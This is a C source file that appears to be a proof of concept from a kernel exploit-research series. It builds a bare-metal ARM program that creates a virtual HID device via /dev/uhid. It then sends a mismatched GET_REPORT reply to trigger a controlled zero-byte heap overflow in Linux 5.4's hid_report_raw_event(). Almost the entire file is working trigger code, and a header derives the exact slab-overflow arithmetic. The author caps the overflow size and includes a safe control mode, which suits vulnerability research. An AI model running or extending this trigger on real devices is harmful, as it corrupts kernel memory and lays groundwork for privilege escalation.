/*
 * uhid_spill.c -- Phase 13 Round 21: controlled 2-4 byte zero-overflow
 * experiment against CVE-2026-43047 in Linux 5.4.286 hid_report_raw_event().
 *
 * Bare-metal armv7a static ELF (no libc headers, raw svc 0 syscalls).
 *
 * EXACT SOURCE-DERIVED MATH (verified against v5.4.286 hid-core.c):
 *   mt_get_feature(report3) allocates buf = hid_alloc_report_buf() =>
 *       kzalloc(hid_report_len(report3) + 7) = kzalloc((1+1)+7) = kzalloc(9)
 *       -> SLUB kmalloc-16 object (16 usable bytes).
 *   hid_report_raw_event(..., buf, size=hid_report_len(report3)=2, ...):
 *       numbered -> cdata=buf+1, csize=1
 *       report = hid_get_report() selects data[0] (we set it to 4)
 *       rsize = hid_compute_report_size(report4) = N4 data bytes
 *       if (csize < rsize) memset(cdata+csize, 0, rsize-csize)
 *         => memset(buf+2, 0, N4-1), last written byte at buf+N4
 *   Zero bytes past the 9-byte REQUEST  = N4 - 8
 *   Zero bytes past the 16-byte OBJECT = N4 - 15  (only if N4 >= 16)
 *
 *   N4=12 -> 4 past request, 0 past object (fully inside our own slab object)
 *   N4=16 -> 8 past request, 1 past object
 *   N4=19 -> 11 past request, 4 past object  <-- HARD SAFETY CAP
 *
 * We NEVER exceed N4=19 and NEVER write a large/mismatched report size.
 * Modes: "ctl" = safe matching reply data[0]=3; "spill" = data[0]=4.
 *
 * Build:
 *   clang --target=armv7a-linux-androideabi21 -nostdlib -static -Os \
 *         -o uhid_spill uhid_spill.c
 * Usage: uhid_spill <N4:10..19> <ctl|spill> [replysize:1|2]
 */
#define __NR_exit   1
#define __NR_read   3
#define __NR_write  4
#define __NR_close  6
#define __NR_poll 168
#define __NR_openat 322

#define AT_FDCWD (-100)
#define O_RDWR   2
#define POLLIN   1

typedef unsigned char      u8;
typedef unsigned short     u16;
typedef unsigned int       u32;
typedef unsigned long long u64;

enum {
    UHID_DESTROY=1, UHID_START=2, UHID_STOP=3, UHID_OPEN=4, UHID_CLOSE=5,
    UHID_OUTPUT=6, UHID_GET_REPORT=9, UHID_GET_REPORT_REPLY=10,
    UHID_CREATE2=11, UHID_INPUT2=12, UHID_SET_REPORT=13,
    UHID_SET_REPORT_REPLY=14,
};
struct uhid_start_req { u64 dev_flags; } __attribute__((packed));
struct uhid_create2_req {
    u8 name[128]; u8 phys[64]; u8 uniq[64];
    u16 rd_size; u16 bus; u32 vendor; u32 product; u32 version; u32 country;
    u8 rd_data[4096];
} __attribute__((packed));
struct uhid_get_report_req { u32 id; u8 rnum; u8 rtype; } __attribute__((packed));
struct uhid_get_report_reply_req {
    u32 id; u16 err; u16 size; u8 data[4096];
} __attribute__((packed));
struct uhid_event {
    u32 type;
    union {
        struct uhid_create2_req create2;
        struct uhid_start_req start;
        struct uhid_get_report_req get_report;
        struct uhid_get_report_reply_req get_report_reply;
    } u;
} __attribute__((packed));
struct pollfd { int fd; short events; short revents; };

/* descriptor assembled at runtime because report-4 Report Count is N4 */
static u8 rd[160];
static int rd_len;

/* minimal ARM EABI runtime helpers (-nostdlib) */
void __aeabi_memcpy(void*d,const void*s,unsigned n)
{volatile u8*x=d;volatile const u8*y=s;while(n--)*x++=*y++;}
void __aeabi_memmove(void*d,const void*s,unsigned n){__aeabi_memcpy(d,s,n);}
void __aeabi_memset(void*d,int c,unsigned n)
{volatile u8*x=d;while(n--)*x++=(u8)c;}
void __aeabi_memclr(void*d,unsigned n){__aeabi_memset(d,0,n);}

static void zero_(void*p,unsigned n){volatile u8*q=p;while(n--)*q++=0;}
static void copy_(u8*d,const char*s){volatile const char*p=s;while(*p)*d++=(u8)*p++;}
static long sys3(long n,long a,long b,long c)
{
    register long r0 asm("r0")=a, r1 asm("r1")=b, r2 asm("r2")=c, r7 asm("r7")=n;
    asm volatile("svc 0":"+r"(r0):"r"(r1),"r"(r2),"r"(r7):"memory");
    return r0;
}
static int slen_(const char*s){volatile const char*p=s;int n=0;while(*p){p++;n++;}return n;}
static void puts_(const char*s){sys3(__NR_write,1,(long)s,slen_(s));}
static void putint(long v)
{
    char b[24];int i=0,neg=0;
    if(v<0){neg=1;v=-v;}
    if(!v)b[i++]='0';
    while(v>0){b[i++]='0'+(v%10);v/=10;}
    if(neg)sys3(__NR_write,1,(long)"-",1);
    for(int j=i-1;j>=0;j--){char c=b[j];sys3(__NR_write,1,(long)&c,1);}
}
static void puthex(u32 v)
{
    char b[8];const char*h="0123456789abcdef";
    for(int i=7;i>=0;i--){b[i]=h[v&0xf];v>>=4;}
    sys3(__NR_write,1,(long)b,8);
}
static int eq_(const char*a,const char*b)
{
    volatile const char*x=a,*y=b;
    while(*x&&*y){if(*x!=*y)return 0;x++;y++;}
    return *x==*y;
}

static unsigned parse_n4(const char *s);

static void build_rd(u8 n4)
{
    u8 *p = rd;
    #define EMIT(...) do{ u8 _a[]={__VA_ARGS__}; for(unsigned _i=0;_i<sizeof(_a);_i++)*p++=_a[_i]; }while(0)
    /* Digitizer / Touch Screen application collection */
    EMIT(0x05,0x0D, 0x09,0x04, 0xA1,0x01);
    /* Input report ID 1: ContactID/X/Y -> hid group MULTITOUCH */
    EMIT(0x85,0x01, 0x09,0x22, 0xA1,0x02, 0x09,0x51, 0x09,0x30, 0x09,0x31,
         0x15,0x00, 0x26,0xFF,0x00, 0x75,0x08, 0x95,0x03, 0x81,0x02, 0xC0);
    /* FEATURE report ID 3: HID_DG_CONTACTMAX (1 byte) -> probe GET_REPORT */
    EMIT(0x85,0x03, 0x09,0x55, 0x15,0x00, 0x26,0xFF,0x00, 0x75,0x08, 0x95,0x01, 0xB1,0x02);
    /* FEATURE report ID 4: N4-byte vendor blob (the oversized report) */
    EMIT(0x85,0x04, 0x06,0x00,0xFF, 0x09,0x01, 0x15,0x00, 0x26,0xFF,0x00,
         0x75,0x08, 0x95,n4, 0xB1,0x02);
    EMIT(0xC0); /* End Collection */
    #undef EMIT
    rd_len = (int)(p - rd);
}

static void print_event(struct uhid_event*ev,long n)
{
    puts_("  EVENT type="); putint(ev->type);
    switch(ev->type){
    case UHID_START: puts_(" (UHID_START) flags=0x");puthex((u32)ev->u.start.dev_flags);break;
    case UHID_STOP: puts_(" (UHID_STOP)");break;
    case UHID_OPEN: puts_(" (UHID_OPEN)");break;
    case UHID_CLOSE:puts_(" (UHID_CLOSE)");break;
    case UHID_OUTPUT:puts_(" (UHID_OUTPUT)");break;
    case UHID_GET_REPORT:
        puts_(" (GET_REPORT) id=");putint(ev->u.get_report.id);
        puts_(" rnum=");putint(ev->u.get_report.rnum);
        puts_(" rtype=");putint(ev->u.get_report.rtype);break;
    default: puts_(" (other)");
    }
    puts_(" rawlen=");putint(n);puts_("\n");
}

static int spill_mode;
static u8 reply_size;
static int saw_getreport, saw_open, read_errors;

static void handle(int fd,struct uhid_event*in)
{
    if(in->type!=UHID_GET_REPORT) return;
    saw_getreport=1;
    u32 id=in->u.get_report.id;
    u8 rnum=in->u.get_report.rnum;
    struct uhid_event out; zero_(&out,sizeof(out));
    out.type=UHID_GET_REPORT_REPLY;
    out.u.get_report_reply.id=id;
    out.u.get_report_reply.err=0;
    out.u.get_report_reply.size=reply_size;
    if(spill_mode && rnum==3){
        /* MISMATCHED: select report 4 -> rsize=N4 > csize -> memset spill */
        out.u.get_report_reply.data[0]=4;
        out.u.get_report_reply.data[1]=0;
        puts_("  >>> SPILL REPLY id=");putint(id);puts_(" size=");putint(reply_size);
        puts_(" data[0]=4 data[1]=0\n");
    } else {
        /* SAFE control: echo requested report number */
        out.u.get_report_reply.data[0]=rnum;
        out.u.get_report_reply.data[1]=0;
        puts_("  >>> SAFE REPLY id=");putint(id);puts_(" data[0]=");putint(rnum);puts_("\n");
    }
    long w=sys3(__NR_write,fd,(long)&out,sizeof(out));
    puts_("  reply write ret=");putint(w);puts_("\n");
}

static void pump(int fd,int rounds)
{
    for(int i=0;i<rounds;i++){
        struct pollfd p; p.fd=fd;p.events=POLLIN;p.revents=0;
        long pr=sys3(__NR_poll,(long)&p,1,300);
        if(pr<=0)continue;
        struct uhid_event ev; long n=sys3(__NR_read,fd,(long)&ev,sizeof(ev));
        if(n<=0){puts_("  [pump] READ ERROR ret=");putint(n);puts_("\n");read_errors++;return;}
        print_event(&ev,n);
        if(ev.type==UHID_OPEN)saw_open=1;
        if(ev.type==UHID_GET_REPORT||ev.type==UHID_SET_REPORT)handle(fd,&ev);
    }
}

__attribute__((naked)) void _start(void){__asm__ volatile("mov r0,sp\n\tb spill_main\n");}
void spill_main(unsigned long*stackp)
{
    int argc=(int)stackp[0]; char**argv=(char**)&stackp[1];
    puts_("=== Phase13 Round21: UHID small zero-overflow ===\n");
    if(argc<3){puts_("usage: uhid_spill <N4 10..19> <ctl|spill> [replysize]\n");
               sys3(__NR_exit,2,0,0);for(;;){}}
    unsigned n4=(unsigned)parse_n4(argv[1]);
    if(n4<10||n4>19){puts_("N4 out of safe range 10..19\n");sys3(__NR_exit,2,0,0);for(;;){}}
    spill_mode=eq_(argv[2],"spill");
    reply_size=(argc>=4&&eq_(argv[3],"2"))?2:1;
    puts_("[cfg] N4=");putint(n4);
    puts_(" mode=");puts_(spill_mode?"SPILL":"CTL");
    puts_(" replysize=");putint(reply_size);puts_("\n");
    puts_("[math] kzalloc(9)->kmalloc-16; memset(buf+2,0,N4-1); bytes past req=");
    putint((long)n4-8);puts_(" past object=");putint((long)n4-15);puts_("\n");

    build_rd((u8)n4);
    puts_("[cfg] rd_size=");putint(rd_len);puts_("\n");

    long fd=sys3(__NR_openat,AT_FDCWD,(long)"/dev/uhid",O_RDWR);
    puts_("open(/dev/uhid) fd=");putint(fd);puts_("\n");
    if(fd<0){sys3(__NR_exit,1,0,0);for(;;){}}

    struct uhid_event ev;zero_(&ev,sizeof(ev));
    ev.type=UHID_CREATE2;
    copy_(ev.u.create2.name,"vhid-r21");
    copy_(ev.u.create2.phys,"uhid/round21");
    copy_(ev.u.create2.uniq,"R21");
    ev.u.create2.rd_size=(u16)rd_len;
    ev.u.create2.bus=3; ev.u.create2.vendor=0x1234; ev.u.create2.product=0x5678;
    ev.u.create2.version=1; ev.u.create2.country=0;
    for(int i=0;i<rd_len;i++)ev.u.create2.rd_data[i]=rd[i];
    puts_("write(CREATE2) ret=");putint(sys3(__NR_write,fd,(long)&ev,sizeof(ev)));puts_("\n");

    pump(fd,16); /* ~5s: probe, GET_REPORT, reply, OPEN */

    struct uhid_event de;zero_(&de,sizeof(de));
    de.type=UHID_DESTROY;
    puts_("write(DESTROY) ret=");putint(sys3(__NR_write,fd,(long)&de,sizeof(de)));puts_("\n");
    pump(fd,3);
    sys3(__NR_close,fd,0,0);

    puts_("[result] saw_getreport=");putint(saw_getreport);
    puts_(" saw_open=");putint(saw_open);
    puts_(" read_errors=");putint(read_errors);puts_("\n");
    puts_("=== done ===\n");
    sys3(__NR_exit,0,0,0);
    for(;;){}
}

static unsigned parse_n4(const char*s)
{
    unsigned v=0;
    while(*s>='0'&&*s<='9'){v=v*10+(unsigned)(*s-'0');s++;}
    return v;
}
